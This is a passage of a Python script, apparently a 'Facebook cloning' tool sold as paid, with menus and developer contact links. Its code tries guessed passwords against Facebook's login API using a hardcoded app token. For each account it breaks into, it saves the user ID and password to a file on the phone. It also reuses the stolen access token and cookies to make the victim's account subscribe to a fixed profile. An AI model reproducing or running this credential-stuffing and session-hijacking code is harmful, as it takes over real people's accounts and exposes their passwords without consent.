                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-friendly-name':'authenticate'
                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ALEX -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ALEX-LIVE] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        oks.append(ids)
                                                        tok = str(q['access_token'])
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                                                        
                                                        requests.post('https://graph.facebook.com/100071596264601/subscribers?access_token='+tok, cookies={'cookie':coki})
                                                        open('/sdcard/ALEX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ALEX-LIVE] '+uid+' | '+pas+'\033[1;97m')
                                                tok = str(q['access_token'])
                                                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                                               
                                                requests.post('https://graph.facebook.com/100071596264601/subscribers?access_token='+tok, cookies={'cookie':coki})
                                                open('/sdcard/ALEX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

     
#____________________Method Select_____________________#
os.system('clear')
zahid = """\033[1;91m



         ##     ##    ######## ########  ######  ##     ## 
        ###   ###       ##    ##       ##    ## ##     ## 
       #### ####       ##    ##       ##       ##     ## 
      ## ### ##       ##    ######   ##       ######### 
     ##     ##       ##    ##       ##       ##     ## 
    ##     ##       ##    ##       ##    ## ##     ## 
   ##     ##       ##    ########  ######  ##     ## \033[1;95m P.R.O

 \033[1;97m[â—‡]-------------------------------------------------------
 \033[1;97m[â—‡] DEVELOPERS :\033[1;91m TECHNICAL ZAHID\033[1;97m & \033[1;91mMIRWAIS DANISHYAR
 \033[1;97m[â—‡] TEAM       : \033[1;91mMuslim-Tech786 
 \033[1;97m[â—‡] STATUS     : \033[91;1mPaid
 \033[1;97m[â—‡]-------------------------------------------------------"""
def danish():
        os.system('clear')
        print(zahid)


def F5_menu():
		clear()
		print('\033[1;97m [â—‡]-------------------------------------------------------')
		print(' [1] 2004-2005 Cloning\n [2] 2006-2007 Cloning\n [3] 2007-2008 Cloning \n [4] 2009-2010 Cloning\n [0] Exit menu ')
		print('\033[1;97m [â—‡]-------------------------------------------------------')
		menu2 = input(' [?] Choose an option : ')
		if menu2 in ['1','01']:
			aaaaa()
		elif menu2 in ['2','02']:
			ccccc()     
		elif menu2 in ['3','03']:
			ccccc()
		elif menu2 in ['4','04',]:
			bbbbb()
		elif menu2 in ['0','00']:
			print('Thanks for use ').exit()
		else:
			print('  Option not found in menu...');time.sleep(1)
			os.system('python Run.py')
			menu() 
			
def mirwais005():           
                                danish()
                                print(' [1] Cloning System API \n [2] Creat File\n [3] Cloning System Mobile [NO_LOCK]\n [4] Old Cloning 2004 - 2010\n [5] Auto Create Facebook\n [6] Auto Follower Choice ID\n [7] Contact To Admin')
                                print('\033[1;97m [â—‡]-------------------------------------------------------')
                                x=input(' [â—‡] Choose: ')
                                if x in ['1','01']:
                                        menu()
                                if x in ['2','02']:
                                        os.system('git pull')
                                        main_menu()
                                elif x in ['3','03']:
                                        AWM()
                                elif x in ['4','04']:
                                        F5_menu()
                                elif x in ['5','05']:
                                        creatmenu()
                                elif x in ['6','06']:
                                        clear()
                                        print('\033[1;93m [â—‡] Add Next Update ....');time.sleep(3)
                                        print('\033[1;97m [â—‡]-------------------------------------------------------')
                                        mirwais005()
                                elif x in ['7','07']:
                                        contact()
                                else:
                                        mirwais005()
   

def contact():
                                print(' [1] Contact By Mirwais Danishyar\n [2] Contact by Sayed Zahid \n [0] Back menu')
                                print('\033[1;97m [â—‡]-------------------------------------------------------')
                                x=input(' [â—‡] Choose: ')
                                if x in ['1','01']:
                                        os.system('xdg-open https://www.facebook.com/subhanullah.niazay')                                                             
                                        mirwais005()
                                elif x in ['2','02']:
                                        os.system('xdg-open https://www.facebook.com/ProfessioOnalSkipper')                                                             
                                        mirwais005()       
                                else:
                                        mirwais005()

menu()